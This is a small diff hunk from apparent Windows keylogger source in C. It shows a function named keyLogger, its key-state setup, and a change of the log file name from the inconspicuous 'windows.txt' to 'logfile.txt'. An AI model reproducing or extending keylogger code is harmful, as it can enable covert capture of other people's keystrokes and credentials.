@@ -28,7 +28,7 @@ DWORD WINAPI keyLogger(){
 	char chars_va[]="[\\]\';";
 	char chars_vb[]="{|}\"";
 	FILE *KEY_LOG_FILE;
-	char KEY_LOG_NAME[]="windows.txt";
+	char KEY_LOG_NAME[]="logfile.txt";
 	// Setting all elements to 0 in last_key_state array.
 	for(vkey=0;vkey<0xFF;vkey++){
 		last_key_state[vkey]=0;
